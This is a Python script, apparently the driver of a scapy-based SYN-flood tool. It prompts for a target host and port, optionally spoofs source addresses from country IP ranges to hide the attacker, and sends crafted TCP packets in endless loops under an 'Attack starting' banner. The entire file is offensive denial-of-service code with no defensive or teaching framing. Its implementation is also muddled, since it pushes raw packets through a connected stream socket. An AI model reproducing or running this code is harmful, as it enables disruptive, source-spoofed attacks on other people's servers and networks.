#!/usr/bin/env python


from scapy.all import *	
import socket
from userinputs_synflood import *
from Ipchanging_synflood import *
from definepacket_synflood import *
import os
import random
import time

hostname = socket.gethostname()
yourIP = socket.gethostbyname(hostname)
hostname = socket.gethostname()
yourIP = socket.gethostbyname(hostname)
supcountries = supcountries()
destination = definetarget()
targetport = defineporttarget()
awnser_anonymizing = anonymizing_input(supcountries)

cnt = 0
silva = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
silva.connect((destination, targetport))

if awnser_anonymizing in supcountries or awnser_anonymizing == 'all':
   useriprange = chooseiprange(awnser_anonymizing, supcountries)
   Ip_range = ipRange(useriprange)
   time.sleep(5)
   os.system('clear')
   print 'HaCkEr5pReMe'
   print ''
   print 'Attack starting'
   while 0 == 0:         
         Tcp_packet = setpacketinfotcp(targetport)
         Ip_packet = setpacketinfoip(Ip_range,destination)
         silva.send(bytes((Ip_packet/Tcp_packet)))
         cnt = cnt + 1
         print str(cnt) + ' packeges send'

if awnser_anonymizing == yourIP:
   Ip_range = yourIP
   time.sleep(5)
   os.system('clear')
   print 'HaCkEr5pReMe'
   print ''
   print 'Attack starting'
   while 0 == 0:         
         Tcp_packet = setpacketinfotcp(targetport)
         Ip_packet = setpacketinfoip(Ip_range,destination)
         silva.send(bytes((Ip_packet/Tcp_packet)))
         cnt = cnt + 1
         print str(cnt) + ' packeges send'
        
         

if type(awnser_anonymizing) == str and awnser_anonymizing != yourIP:  
    Ip_range = awnser_anonymizing
    time.sleep(5)
    os.system('clear')
    print 'HaCkEr5pReMe'
    print ''
    print 'Attack starting'
    while 0 == 0:
         Ip_packet = setpacketinfoip(Ip_range,destination)
         Tcp_packet = setpacketinfotcp(targetport)
         silva.send(bytes((Ip_packet/Tcp_packet)))
         cnt = cnt + 1
         print str(cnt) + ' packeges send'


if type(awnser_anonymizing) == list and awnser_anonymizing[0] in supcountries:
        useriprange = chooseiprange(awnser_anonymizing, supcountries)
        Ip_range = ipRange(useriprange)
        time.sleep(5	)
        os.system('clear')
        print 'HaCkEr5pReMe'
        print ''
        print 'Attack starting'
        while 0 == 0:
          Ip_packet = setpacketinfoip(Ip_range,destination)
          Tcp_packet = setpacketinfotcp(targetport)
          silva.send(bytes((Ip_packet/Tcp_packet)))
          cnt = cnt + 1
          print str(cnt) + ' packeges send'

        
        
        

